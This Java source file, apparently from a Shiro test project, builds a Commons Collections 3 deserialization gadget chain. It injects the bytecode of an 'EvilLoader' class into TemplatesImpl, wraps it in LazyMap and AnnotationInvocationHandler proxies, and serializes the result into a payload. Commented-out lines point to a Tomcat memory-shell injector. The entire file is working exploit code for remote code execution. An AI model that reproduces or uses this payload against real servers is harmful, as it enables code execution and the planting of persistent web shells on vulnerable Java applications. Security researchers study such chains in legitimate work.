import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.springframework.boot.autoconfigure.web.ServerProperties;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 {
    public byte[] getEvilBytes() throws Exception {
//        ClassPool pool = ClassPool.getDefault();
//        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
//        CtClass ctClass = pool.makeClass("Evil");
//        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
//
//        String staticCmd = "";
//        ctClass.makeClassInitializer().insertBefore(staticCmd);
//
//        byte[] bytes = ctClass.toBytecode();
//        return bytes;
        // String path = "D:\\Project\\ShiroDemo\\src\\test\\java\\TomcatMemShellInject.class";
        // String path = "D:\\Project\\ShiroDemo\\src\\test\\java\\TomcatHeaderSize.class";
        // String path = "D:\\Project\\ShiroDemo\\target\\test-classes\\TYH.class";
//        String path = "D:\\Project\\ShiroDemo\\target\\test-classes\\TZ.class";
//        InputStream inputStream = new FileInputStream(path);
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        int n = 0;
//        while ((n=inputStream.read())!=-1) {
//            byteArrayOutputStream.write(n);
//        }
//        byte[] bytes = byteArrayOutputStream.toByteArray();
//        return bytes;

//        ClassPool pool = ClassPool.getDefault();
//        CtClass clazz = pool.get(T.class.getName());
//        return clazz.toBytecode();

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(EvilLoader.class.getName());
        return clazz.toBytecode();

    }

    public TemplatesImpl getTemplatesImpl() throws Exception{
        byte[] bytes = getEvilBytes();
        Class clazz = TemplatesImpl.class;
        TemplatesImpl templates = (TemplatesImpl) clazz.newInstance();

        Field _name = clazz.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(templates, "test");

        Field _bytecodes = clazz.getDeclaredField("_bytecodes");
        _bytecodes.setAccessible(true);
        _bytecodes.set(templates, new byte[][]{bytes});

        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _tfactory.setAccessible(true);
        _tfactory.set(templates, new TransformerFactoryImpl());
        return templates;
    }
    public byte[] getPOCBytes() throws Exception {
        CommonsCollections3 commonsCollections3 = new CommonsCollections3();
        TemplatesImpl templates = commonsCollections3.getTemplatesImpl();

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        });

        HashMap innerMap = new HashMap();
        LazyMap lazyMap = (LazyMap)LazyMap.decorate(innerMap, chainedTransformer);

        Constructor constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, handler);

        InvocationHandler handler2 = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(handler2);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }
}
